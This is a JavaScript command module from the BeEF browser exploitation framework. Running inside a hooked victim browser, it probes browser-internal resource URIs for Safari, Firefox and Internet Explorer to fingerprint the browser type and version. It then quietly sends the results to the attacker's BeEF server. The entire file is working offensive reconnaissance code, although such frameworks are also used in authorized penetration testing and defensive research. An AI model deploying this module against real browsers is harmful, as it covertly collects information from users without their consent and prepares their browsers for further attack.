//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var browser_type = new Array;
	var browser_version = new Array;
	var dom = document.createElement('b');

	Array.prototype.unique = function() {
		var o = {}, i, l = this.length, r = [];
		for(i=0; i<l;i+=1) o[this[i]] = this[i];
		for(i in o) r.push(o[i]);
		return r;
	};

	parse_browser_details = function() {
		if (!browser_type.length) browser_type[0] = "unknown";
		if (!browser_version.length) browser_version[0] = "unknown";
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "browser_type="+browser_type.unique()+"&browser_version="+browser_version.unique());
	};

	// Browser fingerprints // in the form of: "URI","Browser","version(s)"
	var fingerprints = new Array(
		new Array("Safari","1+","feed://__rsrc__/__rsrc__/NextPage.tif"),
		new Array("Firefox","1+","moz-icon://.autoreg?size=16"),
		new Array("Firefox","2","resource:///res/html/gopher-audio.gif"),
		new Array("Firefox","2-3","jar:resource:///chrome/classic.jar!/skin/classic/browser/Secure.png"),
		new Array("Firefox","4-5","resource:///chrome/browser/skin/classic/browser/Secure.png"),
		new Array("Firefox","1-6","resource:///chrome/browser/content/branding/icon128.png"),
		new Array("Firefox","4+","resource:///chrome/browser/skin/classic/browser/Geolocation-16.png"),
		new Array("Firefox","7+","resource:///chrome/browser/content/browser/aboutHome-snippet1.png"),
		new Array("Firefox","8+","resource:///chrome/browser/skin/classic/aero/browser/Toolbar-inverted.png"),
		new Array("Internet Explorer","5-6","res://shdoclc.dll/pagerror.gif"),
		new Array("Internet Explorer","7-9","res://ieframe.dll/ielogo.png"),
		new Array("Internet Explorer","7+","res://ieframe.dll/info_48.png")
	);

	for (var i=0; i<fingerprints.length; i++) {
		var img = new Image;
		img.id = fingerprints[i][0];
		img.name = fingerprints[i][1];
		img.src = fingerprints[i][2];
		img.onload = function() { browser_type.push(this.id); browser_version.push(this.name); dom.removeChild(this); }
		dom.appendChild(img);
	}

	setTimeout('parse_browser_details();', 2000);

});

